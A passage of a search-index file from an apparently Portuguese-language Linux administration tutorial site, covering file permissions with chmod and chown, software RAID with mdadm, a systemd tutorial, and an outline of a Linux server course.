-l\n</code></pre>"},{"location":"Permissoes_Linux-02/#ja-para-uma-permissao-de-escrita-para-grupo-e-outros-ficaria","title":"J\u00c1 PARA UMA PERMISS\u00c3O DE ESCRITA PARA GRUPO E OUTROS, FICARIA","text":"<pre><code>$ chmod go+w /home/snarl/aplicativo.sh\n</code></pre>"},{"location":"Permissoes_Linux-02/#para-remover-a-permissao-de-escrita-para-grupo-e-leitura-para-outros-ficaria","title":"PARA REMOVER A PERMISS\u00c3O DE ESCRITA PARA GRUPO E LEITURA PARA 'OUTROS', FICARIA:","text":"<pre><code>$ chmod o-w, o-r /home/snarl/aplicativo.sh\n$ ls -l\n</code></pre>"},{"location":"Permissoes_Linux-02/#outro-modo-de-modificar-permissoes-e-usando-uma-combinacao-em-octal-onde-um-conjunto-de-8-numeros-define-as-permissoes-de-acesso","title":"OUTRO MODO DE MODIFICAR PERMISS\u00d5ES, \u00c9 USANDO UMA COMBINA\u00c7\u00c3O EM OCTAL, ONDE UM CONJUNTO DE 8 N\u00daMEROS DEFINE AS PERMISS\u00d5ES DE ACESSO","text":"<pre><code>Valor Octal    |      Valor Bin\u00e1rio\n\nrwx     Caracteres    Significado\n0     000     \u2212\u2212\u2212     nenhuma permiss\u00e3o de acesso\n1     001     \u2212\u2212x     permiss\u00e3o de execu\u00e7\u00e3o\n2     010     -w-     permiss\u00e3o de grava\u00e7\u00e3o\n3     011     -wx     permiss\u00e3o de grava\u00e7\u00e3o e execu\u00e7\u00e3o\n4     100     r\u2212\u2212     permiss\u00e3o de leitura\n5     101     r-x     permiss\u00e3o de leitura e execu\u00e7\u00e3o\n6     110     rw-     permiss\u00e3o de leitura e grava\u00e7\u00e3o\n7     111     rwx     permiss\u00e3o de leitura, grava\u00e7\u00e3o e execu\u00e7\u00e3o\n</code></pre>"},{"location":"Permissoes_Linux-02/#ou-seja-para-remover-todas-as-permissoes-usamos","title":"OU SEJA, PARA REMOVER TODAS AS PERMISS\u00d5ES, USAMOS:","text":"<pre><code>$ chmod 000 /home/snarl/aplicativo.sh\n$ ls -l\n</code></pre>"},{"location":"Permissoes_Linux-02/#entao-se-temos-x1-w2-e-r4-podemos-criar-combinacoes-de-octais-para-definir-acessos","title":"ENT\u00c3O SE TEMOS X=1, W=2 E R=4, PODEMOS CRIAR COMBINA\u00c7\u00d5ES DE OCTAIS PARA DEFINIR ACESSOS.","text":""},{"location":"Permissoes_Linux-02/#por-exemplo-se-fossemos-dar-permissao-de-rwx-para-o-dono-e-de-rx-para-os-grupos-e-outros-fariamos-as-seguintes-combinacoes","title":"POR EXEMPLO, SE FOSSEMOS DAR PERMISS\u00c3O DE RWX PARA O DONO E DE RX PARA OS GRUPOS E OUTROS, FAR\u00cdAMOS AS SEGUINTES COMBINA\u00c7\u00d5ES:","text":"<pre><code>$ chmod 755 /home/snarl/aplicativo.sh\n</code></pre>"},{"location":"Permissoes_Linux-02/#pois-acesso-total-corresponde-a-rwx7-e-acesso-somente-leitura-e-execucao-corresponde-a-rx5","title":"POIS ACESSO TOTAL CORRESPONDE \u00c1 rwx=7 E ACESSO SOMENTE LEITURA E EXECU\u00c7\u00c3O CORRESPONDE \u00c1 rx=5","text":""},{"location":"Permissoes_Linux-02/#modificando-proprietario-de-arquivosdiretorios-com-o-comando-chown","title":"MODIFICANDO PROPRIET\u00c1RIO DE ARQUIVOS/DIRET\u00d3RIOS COM O COMANDO chown","text":""},{"location":"Permissoes_Linux-02/#o-comando-chown-serve-para-mudar-o-usuario-dono-ou-o-grupo-dono-de-um-determinado-arquivodiretorio","title":"O COMANDO chown SERVE PARA MUDAR O 'USU\u00c1RIO DONO' OU O 'GRUPO DONO', DE UM DETERMINADO ARQUIVO/DIRET\u00d3RIO:","text":"<pre><code>chown [op\u00e7oes] [dono:grupo] [diret\u00f3rio/arquivo]\n</code></pre> <pre><code>$ chown -R snarl:users /home/snarl/aplicativo.sh\n</code></pre>"},{"location":"Permissoes_Linux-02/#sendo-que-o-r-valida-o-comando-recursivamente-em-caso-de-aplicado-a-diretorios","title":"Sendo que o -R valida o comando recursivamente, em caso de aplicado \u00e1 diret\u00f3rios.","text":""},{"location":"Raid/","title":"\ud83d\udcc1 RAID - Redundant Array of Independent Disks:","text":"<p>Raid \u00e9 uma tecnologia de armazenamento que envolve a combina\u00e7\u00e3o de v\u00e1rios discos r\u00edgidos (ou unidades de estado s\u00f3lido) em uma \u00fanica unidade l\u00f3gica para melhorar o desempenho, a redund\u00e2ncia ou uma combina\u00e7\u00e3o de ambos. RAID \u00e9 usado principalmente para melhorar a confiabilidade e/ou o desempenho do armazenamento de dados em sistemas de computador.</p>"},{"location":"Raid/#raid-0-striping","title":"RAID 0 (striping):","text":"<pre><code>S\u00e3o usados no m\u00ednimo 2 discos nessa configura\u00e7\u00e3o. A capacidade de \narmazenamento \u00e9 a soma dos discos utilizados. N\u00e3o possui nenhum backup \n(redund\u00e2ncia), embora melhore de forma significante a performance, dando \nmais velocidade de I/O. Exemplo, RAID 0 com dois discos de 200 GB cada um\ntotalizando em 400 GB o volume montado no RAID. Se um disco falhar \u00e9 \nperdido todo o conte\u00fado. Possui striping, ou seja, os discos executam \ntarefas como leitura e grava\u00e7\u00e3o de dados de forma simult\u00e2nea, entregando \nmaior desempenho e liberando a capacidade total dos discos para \narmazenar informa\u00e7\u00f5es.\n</code></pre>"},{"location":"Raid/#raid-1-espelhamento","title":"RAID 1 (espelhamento):","text":"<pre><code>S\u00e3o usados no m\u00ednimo 2 discos nessa configura\u00e7\u00e3o. A capacidade de \narmazenamento \u00e9 metade da soma total dos discos. Exemplo, RAID 0 com dois\ndiscos de 200 GB cada um deles, o espa\u00e7o total no volume montado ser\u00e1 de \n200 GB. Se um disco falhar, o conte\u00fado n\u00e3o \u00e9 perdido.\n</code></pre>"},{"location":"Raid/#raid-4","title":"RAID 4:","text":"<pre><code>S\u00e3o usados no m\u00ednimo 3 discos nessa configura\u00e7\u00e3o. Um dos discos \u00e9 \ndedicado \u00e0 paridade. A capacidade de armazenamento \u00e9 a soma de todos os \ndiscos, menos um. Exemplo, 3 discos de 100GB cada um, resulta em um RAID \n4 de 200GB. O pr\u00f3ximo n\u00edvel de RAID, o 5, possui mais vantagens se \ncomparado com o RAID 4.\n</code></pre>"},{"location":"Raid/#raid-5","title":"RAID 5:","text":"<pre><code>S\u00e3o usados no m\u00ednimo 3 discos nessa configura\u00e7\u00e3o. Possui paridade e \nstriping. Conforme o RAID 4, a capacidade de armazenamento \u00e9 a soma de \ntodos os discos, menos um.\n</code></pre>"},{"location":"Raid/#raid-6","title":"RAID 6:","text":"<pre><code>Existe um segundo disco de paridade, diferentemente do RAID 5, que \npossui apenas 1.\n</code></pre>"},{"location":"Raid/#raid-10","title":"RAID 10:","text":"<pre><code>combina\u00e7\u00e3o do RAID 0 e do RAID 1. Dois ou mais RAID 0 se juntam, formando\num RAID 1, e por consequ\u00eancia, um RAID 10.\n</code></pre>"},{"location":"Raid/#raid-50-e-raid-60","title":"RAID 50 e RAID 60:","text":"<pre><code>S\u00e3o combina\u00e7\u00f5es de RAID 5 e RAID 0 ou RAID 6 e RAID 0, respectivamente. \nEles oferecem um equil\u00edbrio entre desempenho e redund\u00e2ncia, adequados \npara aplicativos de alto desempenho e alta disponibilidade.\n</code></pre>"},{"location":"Raid/#mdadm-md-significa-multiplos-dispositivos-o-adm-de-mdadm-e-abreviacao-para-administracao","title":"MDADM \"md\" significa m\u00faltiplos dispositivos. O \"adm\" de mdadm \u00e9 abrevia\u00e7\u00e3o para administra\u00e7\u00e3o:","text":"<pre><code>sudo apt install mdadm -y\n</code></pre>"},{"location":"Raid/#estou-utilizando-uma-maquina-virtual-com-o-debian-linux-nesta-maquina-possuo-os-seguintes-discos","title":"Estou utilizando uma m\u00e1quina virtual, com o Debian Linux. Nesta m\u00e1quina, possuo os seguintes discos:","text":"<pre><code>    /dev/sda - 50GB (Disco principal)\n    /dev/sdb - 2GB\n    /dev/sdc - 2GB\n    /dev/sdd - 2GB\n    /dev/sde - 2GB\n</code></pre> <pre><code>sudo -i\n</code></pre> <pre><code>mdadm --create /dev/md0 --level=0 --raid-devices=4 /dev/sdb /dev/sdc /dev/sdd /dev/sde\n</code></pre> <pre><code>mdadm: Defaulting to version 4.1 metadata\n</code></pre> <pre><code>mdadm: array /dev/md0 started \n</code></pre>"},{"location":"Raid/#agora-o-disco-virtual-chamado-devmd0-foi-criado-em-meu-sistema-devemos-entao-atualizar-o-arquivo-de-configuracao-do-mdadm-forcando-o-dispositivo-a-se-chamar-devmd0-caso-contrario-o-udev-ira-automaticamente-renomea-lo-para-devmd127","title":"Agora o disco virtual chamado /dev/md0 foi criado em meu sistema. Devemos ent\u00e3o atualizar o arquivo de configura\u00e7\u00e3o do mdadm, for\u00e7ando o dispositivo a se chamar /dev/md0. Caso contr\u00e1rio, o udev ir\u00e1 automaticamente renome\u00e1-lo para /dev/md127:","text":"<pre><code>mdadm --detail --scan /dev/md0 &gt;&gt; /etc/mdadm/mdadm.conf\n</code></pre> <pre><code>update-initramfs -u\n</code></pre> <pre><code>cat /proc/mdstat\n</code></pre> <pre><code>sudo mdadm --detail /dev/md0\n</code></pre> <pre><code> mkfs.ext4 /dev/md0\n</code></pre> <pre><code>mkdir /mnt/md0\n</code></pre> <pre><code>mount /dev/md0 /mnt/md0\n</code></pre> <pre><code>df -h\n</code></pre> <pre><code>/dev/md0        7,9G   36M  7,4G   1% /mnt/md0\n</code></pre>"},{"location":"Raid/#para-remover-o-raid-com-o-mdadm","title":"Para remover o RAID com o MDADM:","text":"<pre><code>umount /dev/md0\n</code></pre> <pre><code>mdadm --stop /dev/md0\n</code></pre> <pre><code>mdadm --zero-superblock /dev/sdb\n</code></pre> <pre><code>mdadm --zero-superblock /dev/sdc\n</code></pre> <pre><code>mdadm --zero-superblock /dev/sdd\n</code></pre> <pre><code>mdadm --zero-superblock /dev/sde\n</code></pre> <pre><code>nano /etc/mdadm/mdadm.conf\n</code></pre> <pre><code>ARRAY /dev/md0 metadata=1.2 name=debian:0 UUID=5ecf1997:9d6ea966:a3590659:e36f5a88\n</code></pre> <pre><code>update-initramfs -u\n</code></pre> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Systemd/","title":"\ud83d\udcc1 Tutorial Completo de systemd","text":""},{"location":"Systemd/#introducao","title":"\ud83d\udcd6 Introdu\u00e7\u00e3o","text":"<p>O systemd \u00e9 um system and service manager para sistemas Linux modernos. Ele substitui o SysVinit tradicional e prov\u00ea recursos avan\u00e7ados para gerenciamento de servi\u00e7os, inicializa\u00e7\u00e3o do sistema, logging, controle de depend\u00eancias e gerenciamento de recursos.</p>"},{"location":"Systemd/#conceitos-fundamentais","title":"\ud83d\udee0\ufe0f Conceitos Fundamentais","text":""},{"location":"Systemd/#o-que-e-o-systemd","title":"O que \u00e9 o systemd?","text":"<ul> <li>Gerenciador de servi\u00e7os: Controla inicializa\u00e7\u00e3o, interrup\u00e7\u00e3o e supervis\u00e3o de processos.</li> <li>Gerenciador de unidades (units): Tudo no systemd \u00e9 representado como uma unit.</li> <li>Inicializa\u00e7\u00e3o paralela: Acelera o boot executando servi\u00e7os em paralelo.</li> <li>Integra\u00e7\u00e3o com journal: Sistema de logs centralizado (<code>journalctl</code>).</li> </ul>"},{"location":"Systemd/#tipos-de-units","title":"Tipos de Units","text":"<ul> <li><code>.service</code> \u2192 Representa servi\u00e7os (daemons).</li> <li><code>.socket</code> \u2192 Define sockets para ativa\u00e7\u00e3o sob demanda.</li> <li><code>.target</code> \u2192 Agrupamento l\u00f3gico de units (substitui runlevels).</li> <li><code>.mount</code> e <code>.automount</code> \u2192 Gerenciam pontos de montagem.</li> <li><code>.timer</code> \u2192 Tarefas agendadas (substitui cron em alguns cen\u00e1rios).</li> <li><code>.slice</code> e <code>.scope</code> \u2192 Gerenciam recursos (CPU, mem\u00f3ria).</li> </ul>"},{"location":"Systemd/#comandos-essenciais","title":"\ud83d\ude80 Comandos Essenciais","text":""},{"location":"Systemd/#verificar-status","title":"Verificar status","text":"<pre><code>systemctl status nginx.service\n</code></pre>"},{"location":"Systemd/#iniciar-parar-reiniciar","title":"Iniciar / Parar / Reiniciar","text":"<pre><code>systemctl start nginx.service\nsystemctl stop nginx.service\nsystemctl restart nginx.service\n</code></pre>"},{"location":"Systemd/#habilitar-desabilitar-no-boot","title":"Habilitar / Desabilitar (no boot)","text":"<pre><code>systemctl enable nginx.service\nsystemctl disable nginx.service\n</code></pre>"},{"location":"Systemd/#listar-servicos-ativos","title":"Listar servi\u00e7os ativos","text":"<pre><code>systemctl list-units --type=service\n</code></pre>"},{"location":"Systemd/#recarregar-unidades-apos-alteracoes","title":"Recarregar unidades ap\u00f3s altera\u00e7\u00f5es","text":"<pre><code>systemctl daemon-reload\n</code></pre>"},{"location":"Systemd/#trabalhando-com-units","title":"\ud83e\udde9 Trabalhando com Units","text":""},{"location":"Systemd/#estrutura-de-uma-unit-service","title":"Estrutura de uma Unit <code>.service</code>","text":"<p>Exemplo: <code>/etc/systemd/system/meuapp.service</code> <pre><code>[Unit]\nDescription=Meu Aplicativo Exemplo\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/python3 /opt/meuapp/app.py\nRestart=always\nUser=meuusuario\nWorkingDirectory=/opt/meuapp\n\n[Install]\nWantedBy=multi-user.target\n</code></pre></p> <p>Explica\u00e7\u00e3o:</p> <ul> <li><code>Description</code>: Descri\u00e7\u00e3o do servi\u00e7o.</li> <li><code>After</code>: Define depend\u00eancias de inicializa\u00e7\u00e3o.</li> <li><code>ExecStart</code>: Comando que inicia o processo.</li> <li><code>Restart</code>: Pol\u00edtica de rein\u00edcio (ex: always, on-failure).</li> <li><code>User</code>: Usu\u00e1rio que executa o processo.</li> <li><code>WorkingDirectory</code>: Diret\u00f3rio de trabalho.</li> <li><code>WantedBy</code>: Indica em qual target o servi\u00e7o ser\u00e1 ativado.</li> </ul>"},{"location":"Systemd/#ativar-novo-servico","title":"Ativar novo servi\u00e7o","text":"<pre><code>sudo systemctl daemon-reload\nsudo systemctl enable meuapp.service\nsudo systemctl start meuapp.service\n</code></pre>"},{"location":"Systemd/#timers-agendamentos","title":"\u23f1\ufe0f Timers (Agendamentos)","text":"<p>Exemplo de timer que roda um script diariamente:</p> <p>Arquivo <code>/etc/systemd/system/backup.service</code> <pre><code>[Unit]\nDescription=Backup Di\u00e1rio\n\n[Service]\nExecStart=/usr/local/bin/backup.sh\n</code></pre></p> <p>Arquivo <code>/etc/systemd/system/backup.timer</code> <pre><code>[Unit]\nDescription=Agendamento de Backup Di\u00e1rio\n\n[Timer]\nOnCalendar=daily\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n</code></pre></p> <p>Ativar: <pre><code>sudo systemctl enable backup.timer\nsudo systemctl start backup.timer\n</code></pre></p> <p>Ver timers ativos: <pre><code>systemctl list-timers\n</code></pre></p>"},{"location":"Systemd/#logs-e-diagnostico","title":"\ud83d\udcdc Logs e Diagn\u00f3stico","text":"<ul> <li> <p>Ver logs de todo o sistema: <pre><code>journalctl\n</code></pre></p> </li> <li> <p>Ver logs de um servi\u00e7o espec\u00edfico: <pre><code>journalctl -u nginx.service\n</code></pre></p> </li> <li> <p>Acompanhar em tempo real: <pre><code>journalctl -u meuapp.service -f\n</code></pre></p> </li> </ul>"},{"location":"Systemd/#gerenciamento-de-recursos","title":"\ud83d\udd12 Gerenciamento de Recursos","text":"<p>O systemd integra-se ao cgroups do kernel Linux para controlar recursos:</p> <p>Exemplo: limitar mem\u00f3ria de um servi\u00e7o (<code>/etc/systemd/system/meuapp.service.d/limites.conf</code>): <pre><code>[Service]\nMemoryMax=500M\nCPUQuota=50%\n</code></pre></p> <p>Aplicar: <pre><code>systemctl daemon-reexec\nsystemctl restart meuapp.service\n</code></pre></p>"},{"location":"Systemd/#targets-e-boot","title":"\ud83d\udd04 Targets e Boot","text":""},{"location":"Systemd/#targets-comuns","title":"Targets comuns","text":"<ul> <li><code>graphical.target</code> \u2192 Interface gr\u00e1fica.</li> <li><code>multi-user.target</code> \u2192 Multiusu\u00e1rio, sem GUI.</li> <li><code>rescue.target</code> \u2192 Modo de recupera\u00e7\u00e3o.</li> <li><code>emergency.target</code> \u2192 Modo de emerg\u00eancia.</li> </ul> <p>Ver target atual: <pre><code>systemctl get-default\n</code></pre></p> <p>Alterar target padr\u00e3o: <pre><code>systemctl set-default multi-user.target\n</code></pre></p> <p>Entrar em modo de emerg\u00eancia: <pre><code>systemctl isolate emergency.target\n</code></pre></p>"},{"location":"Systemd/#exemplos-avancados","title":"\ud83e\uddea Exemplos Avan\u00e7ados","text":""},{"location":"Systemd/#servico-com-dependencia-de-banco-de-dados","title":"Servi\u00e7o com depend\u00eancia de banco de dados","text":"<pre><code>[Unit]\nDescription=Aplicativo Web\nAfter=network.target mariadb.service\nRequires=mariadb.service\n</code></pre>"},{"location":"Systemd/#socket-activation","title":"Socket Activation","text":"<p>Arquivo <code>/etc/systemd/system/meuapp.socket</code>: <pre><code>[Unit]\nDescription=Socket para MeuApp\n\n[Socket]\nListenStream=8080\n\n[Install]\nWantedBy=sockets.target\n</code></pre></p> <p>Arquivo <code>/etc/systemd/system/meuapp.service</code>: <pre><code>[Service]\nExecStart=/opt/meuapp/server --socket-activated\n</code></pre></p>"},{"location":"Systemd/#conclusao","title":"\ud83d\udcda Conclus\u00e3o","text":"<p>O systemd \u00e9 muito mais do que um simples substituto do <code>init</code>: - Fornece controle detalhado sobre servi\u00e7os. - Possibilita agendamentos com timers. - Facilita o monitoramento via journal. - Gerencia recursos de forma integrada.  </p> <p>\u00c9 uma ferramenta essencial para administradores de sistemas Linux modernos.  </p>"},{"location":"Universo_NIX/","title":"\ud83d\udcc1 O Universo *nix - Conceitos","text":""},{"location":"Universo_NIX/#o-unix","title":"O Unix","text":"<ul> <li>Conceituando o Unix</li> <li>In\u00edcio do Unics com Ken Thompson e Denis Ritchie em 1969</li> <li>Reescrito em 1973 na linguagem C e renomeado para Unix</li> <li>O Unix na atualidade</li> <li>A filosofia KISS (Keep It Simple Stupid)</li> </ul>"},{"location":"Universo_NIX/#o-gnu","title":"O GNU","text":"<ul> <li>Richard Stalmann</li> <li>Conceituando o GNU (GNU is Not Unix)</li> <li>Princ\u00edpios e filosofia por tr\u00e1s do GNU</li> <li>Como o GNU auxilia no mundo do SL</li> </ul>"},{"location":"Universo_NIX/#o-movimento-de-software-livre-e-a-licenca-gpl","title":"O movimento de Software Livre e a Licen\u00e7a GPL","text":"<ul> <li>Conceituando a Freee Software Fundation</li> <li>Princ\u00edpios e filosofia por tr\u00e1s da GPL </li> <li>As 4 liberdades do SL</li> <li>Como a GPL afeta o desenvolvimento de software no Linux</li> </ul>"},{"location":"Universo_NIX/#introducao-ao-sistema-operacional-linux","title":"Introdu\u00e7\u00e3o ao Sistema Operacional Linux","text":"<ul> <li>O que \u00e9 o Linux?</li> <li>Hist\u00f3ria e evolu\u00e7\u00e3o do Linux</li> <li>As diversas distribui\u00e7\u00f5es Linux e suas deriva\u00e7\u00f5es</li> <li>Distros Linux mais populares na atualidade</li> </ul>"},{"location":"Universo_NIX/#o-kernel-linux","title":"O Kernel Linux","text":"<ul> <li>Conceituando o Kernel</li> <li>Interliga\u00e7\u00e3o entre Harware e Software</li> <li>Como o Kernel trabalha</li> </ul>"},{"location":"Universo_NIX/#por-que-usar-linux-em-servidores","title":"Por que usar Linux em Servidores","text":"<ul> <li>Vantagens do Linux como sistema operacional de servidor</li> <li>Casos de uso comuns para servidores Linux</li> <li>Firewall, Controlador de Dom\u00ednio, Servidor de Arquivos, DNS, Proxy, e-Mail, FTP, DHCP</li> <li>Exemplos de empresas que usam Linux em servidores</li> </ul>"},{"location":"Universo_NIX/#o-mercado-de-trabalho-para-profissionais-linux","title":"O Mercado de Trabalho para Profissionais Linux","text":"<ul> <li>Demandas do mercado para profissionais de Linux</li> <li>Carreiras relacionadas ao Linux</li> <li>Certifica\u00e7\u00f5es Linux e sua import\u00e2ncia</li> </ul>"},{"location":"Universo_NIX/#principais-diferencas-entre-linux-e-windows","title":"Principais Diferen\u00e7as entre Linux e Windows","text":"<ul> <li>Arquitetura de sistemas</li> <li>Modelo de licenciamento</li> <li>Interfaces de linha de comando vs. interfaces gr\u00e1ficas</li> </ul>"},{"location":"Universo_NIX/#principais-diferencas-entre-linux-e-unix","title":"Principais Diferen\u00e7as entre Linux e Unix","text":"<ul> <li>Hist\u00f3ria e rela\u00e7\u00e3o entre Linux e Unix</li> <li>Diferen\u00e7as na arquitetura e recursos</li> <li>FreeBSD, NetBSD, OpenBSD, Solaris, AIX, MacOS</li> </ul>"},{"location":"Universo_NIX/#guia-para-instalacao-do-debian-linux","title":"Guia para Instala\u00e7\u00e3o do Debian Linux","text":"<ul> <li>Baixando uma imagem ISO do Debian Linux</li> <li>Passos para a instala\u00e7\u00e3o do Debian Linux</li> <li>Configura\u00e7\u00e3o inicial ap\u00f3s a instala\u00e7\u00e3o</li> </ul>"},{"location":"Universo_NIX/#estrutura-de-diretorios-no-linux","title":"Estrutura de Diret\u00f3rios no Linux","text":"<ul> <li>Vis\u00e3o geral da hierarquia de diret\u00f3rios</li> <li>Significado e conte\u00fado de diret\u00f3rios comuns</li> <li>Import\u00e2ncia do FHS para a padroniza\u00e7\u00e3o dos diret\u00f3rios</li> </ul>"},{"location":"Universo_NIX/#arquitetura-do-sistema-operacional-linux","title":"Arquitetura do Sistema Operacional Linux","text":"<ul> <li>Componentes principais do sistema operacional Linux e a intera\u00e7\u00e3o com Harware</li> <li>Kernel, Bibliotecas do sistema, Shell, Aplica\u00e7\u00f5es, espa\u00e7o de usu\u00e1rio, drivers e m\u00f3dulos, ger\u00eancia de pacotes</li> </ul>"},{"location":"Universo_NIX/#diversos-sistemas-de-arquivos-no-linux","title":"Diversos Sistemas de Arquivos no Linux","text":"<ul> <li>Conceituando Sistema de Arquivos</li> <li>Inodes/Metadados, tempo, permiss\u00e3o, tipo, tamanho, endere\u00e7o</li> <li>Ext4, FAT32, XFS, Btrfs e outros sistemas de arquivos</li> <li>Escolhendo o sistema de arquivos certo para diferentes casos de uso</li> </ul>"},{"location":"Universo_NIX/#particoes-linux","title":"Parti\u00e7\u00f5es Linux","text":"<ul> <li>Conceituando particionamento</li> <li>Parti\u00e7\u00e3o prim\u00e1ria, parti\u00e7\u00e3o secund\u00e1ria, parti\u00e7\u00e3o extendida, parti\u00e7\u00e3o l\u00f3gica, Comandos e utilit\u00e1rios de particionamento</li> <li>Parti\u00e7\u00e3o MBR e EFI</li> </ul>"},{"location":"Universo_NIX/#diversas-distribuicoes-linux","title":"Diversas Distribui\u00e7\u00f5es Linux","text":"<ul> <li>Explorando diferentes distribui\u00e7\u00f5es (Slackware, Debian, RedHat, OpenSUSE, etc)</li> <li>As distros derivadas. Ubuntu, Fedora, Mint, Kali, Raspian, Android</li> <li>Escolhendo a distribui\u00e7\u00e3o certa para suas necessidades</li> </ul>"},{"location":"Universo_NIX/#diversas-interfaces-graficas-do-linux","title":"Diversas Interfaces Gr\u00e1ficas do Linux","text":"<ul> <li>GNOME, KDE, XFCE, Mate, Cinnamon e outras interfaces gr\u00e1ficas</li> <li>Personaliza\u00e7\u00e3o e usabilidade</li> </ul>"},{"location":"Universo_NIX/#gerenciamento-de-boot-no-linux","title":"Gerenciamento de Boot no Linux","text":"<ul> <li>Conceituando o boot do sistema</li> <li>O Lilo</li> <li>O GRUB (Grand Unified Bootloader)</li> <li>Configura\u00e7\u00e3o do GRUB</li> <li>Solu\u00e7\u00e3o de problemas de inicializa\u00e7\u00e3o</li> </ul>"},{"location":"Universo_NIX/#uso-do-terminal-no-linux","title":"Uso do Terminal no Linux","text":"<ul> <li>Conceituando o Terminal (ts,tty)</li> <li>Navega\u00e7\u00e3o e manipula\u00e7\u00e3o de diret\u00f3rios</li> <li>Comandos b\u00e1sicos do Linux</li> <li>Redirecionamento e pipes</li> </ul>"},{"location":"Universo_NIX/#tipos-de-arquivos-no-linux","title":"Tipos de Arquivos no Linux","text":"<ul> <li>Arquivos regulares, diret\u00f3rios, links simb\u00f3licos, dispositivos, etc</li> <li>Permiss\u00f5es e propriedades de arquivos</li> </ul>"},{"location":"Universo_NIX/#permissoes-no-linux","title":"Permiss\u00f5es no Linux","text":"<ul> <li>Entendendo as permiss\u00f5es de usu\u00e1rio, arquivo e diret\u00f3rio</li> <li>Modificando permiss\u00f5es e atributos, chmod, chown, chattr</li> </ul>"},{"location":"Universo_NIX/#montagem-de-diretorios-no-linux","title":"Montagem de Diret\u00f3rios no Linux","text":"<ul> <li>Montando dispositivos de armazenamento</li> <li>Montagem autom\u00e1tica vs. manual</li> </ul>"},{"location":"Universo_NIX/#compactacao-de-arquivos-no-linux","title":"Compacta\u00e7\u00e3o de Arquivos no Linux","text":"<ul> <li>Compress\u00e3o e descompress\u00e3o de arquivos</li> <li>Formatos de compacta\u00e7\u00e3o (tar, gzip, zip)</li> </ul>"},{"location":"Universo_NIX/#contas-de-usuarios-e-grupos-no-linux","title":"Contas de Usu\u00e1rios e Grupos no Linux","text":"<ul> <li>Gerenciando usu\u00e1rios e grupos</li> <li>Controle de acesso e seguran\u00e7a</li> </ul>"},{"location":"Universo_NIX/#gerenciamento-de-rede-em-servidores-linux","title":"Gerenciamento de rede em Servidores Linux","text":"<ul> <li>Conceituando endere\u00e7o ip</li> <li>Configurando ip din\u00e2mico e ip fixo</li> <li>Conceituando DNS</li> <li>Conceituando Hostname</li> </ul>"},{"location":"Universo_NIX/#acesso-remoto-e-transferencia-de-arquivos-por-ssh","title":"Acesso Remoto e transfer\u00eancia de arquivos por SSH","text":"<ul> <li>Conceituando o SSH (Secure Shell)</li> <li>Configurando acesso SSH</li> <li>Seguran\u00e7a em conex\u00f5es SSH</li> <li>scp, ssh-keygen, sshcopy-id</li> </ul>"},{"location":"Universo_NIX/#analise-de-processos-e-logs-no-linux","title":"An\u00e1lise de Processos e logs no Linux","text":"<ul> <li>Monitoramento e gerenciamento de processos</li> <li>Comandos ps, top, htop, logs com systemd, etc</li> </ul>"},{"location":"Universo_NIX/#gerenciamento-de-servicos-com-systemd","title":"Gerenciamento de Servi\u00e7os com systemd","text":"<ul> <li>O que \u00e9 systemd?</li> <li>Gerenciando servi\u00e7os, unidades e inicializa\u00e7\u00e3o</li> <li>Outros gerenciadores de inicializa\u00e7\u00e3o </li> </ul>"},{"location":"Universo_NIX/#automatizacao-de-tarefas-com-linux","title":"Automatiza\u00e7\u00e3o de Tarefas com Linux","text":"<ul> <li>Agendamento de tarefas com cron</li> <li>Scripting e automa\u00e7\u00e3o de tarefas repetitivas</li> </ul>"},{"location":"Universo_NIX/#raid-com-linux","title":"RAID com Linux","text":"<ul> <li>Introdu\u00e7\u00e3o a RAID (Redundant Array of Independent Disks)</li> <li>Configurando RAID no Linux</li> </ul>"},{"location":"Universo_NIX/#lvm-com-linux","title":"LVM com Linux","text":"<ul> <li>O que \u00e9 LVM (Logical Volume Manager)</li> <li>Gerenciamento de volumes l\u00f3gicos</li> </ul>"},{"location":"Universo_NIX/#dhcp-server","title":"DHCP Server","text":"<ul> <li>Conceito de Servidor de DHCP</li> <li>Instala\u00e7\u00e3o de pacotes e edi\u00e7\u00e3o de arquivos do dhcp server</li> </ul>"},{"location":"Universo_NIX/#web-server","title":"Web Server","text":"<ul> <li>Conceituando o Servidor de P\u00e1ginas Web</li> <li>Instala\u00e7\u00e3o dos pacotes do Apache Server</li> <li>Configura\u00e7\u00e3o do Apache Server</li> <li>Primeira p\u00e1gina Web</li> <li>O Nginx Server</li> </ul>"},{"location":"Universo_NIX/#proxy-server","title":"Proxy Server","text":"<ul> <li>Conceito de Proxy Server</li> <li>Instala\u00e7\u00e3o e configura\u00e7\u00e3o do Squid Proxy Server</li> <li>Bloqueios e logs de usu\u00e1rios</li> </ul>"},{"location":"Universo_NIX/#nfs-server","title":"NFS Server","text":"<ul> <li>Conceituando o NFS (Network File Sistem)</li> <li>Instalando os pacotes do NFS</li> <li>Configurando acesso NFS</li> <li>Seguran\u00e7a em conex\u00f5es NFS</li> </ul>"},{"location":"Universo_NIX/#ftp-server","title":"FTP Server","text":"<ul> <li>Conceituando o Servidor de FTP</li> <li>Configurando acesso FTP</li> <li>Seguran\u00e7a em conex\u00f5es FTP</li> <li>sftp</li> </ul>"},{"location":"Universo_NIX/#file-server","title":"File Server","text":"<ul> <li>Conceito de Servidor de Arquivos</li> <li>Instala\u00e7\u00e3o dos pacotes Samba4 compilado</li> <li>Configura\u00e7\u00e3o do File Server</li> </ul>"},{"location":"Universo_NIX/#backups-de-dados-com-scripts","title":"Backups de dados com scripts","text":"<ul> <li>O que \u00e9 backup?</li> <li>Criando scripts de backup</li> <li>Gerenciando de backups automaticos com cron</li> </ul>"},{"location":"Universo_NIX/#controlador-de-dominio-primario","title":"Controlador de Dom\u00ednio Prim\u00e1rio","text":"<ul> <li>Conceito de DC01</li> <li>Instala\u00e7\u00e3o dos pacotes Samba4</li> <li>Configura\u00e7\u00e3o do DC01</li> </ul>"},{"location":"Universo_NIX/#controlador-de-dominio-primario-secundario","title":"Controlador de Dom\u00ednio Prim\u00e1rio Secund\u00e1rio","text":"<ul> <li>Conceito de DC02</li> <li>Instala\u00e7\u00e3o dos pacotes Samba4</li> <li>Configura\u00e7\u00e3o do DC02</li> </ul>"},{"location":"Universo_NIX/#dns-server","title":"DNS Server","text":"<ul> <li>Conceito de DNS</li> <li>Instala\u00e7\u00e3o dos pacotes BIND9</li> <li>Configura\u00e7\u00e3o do bind</li> </ul>"},{"location":"Universo_NIX/#ntp-server","title":"NTP Server","text":"<ul> <li>Conceito de NTP</li> <li>Instala\u00e7\u00e3o dos pacotes NTP</li> 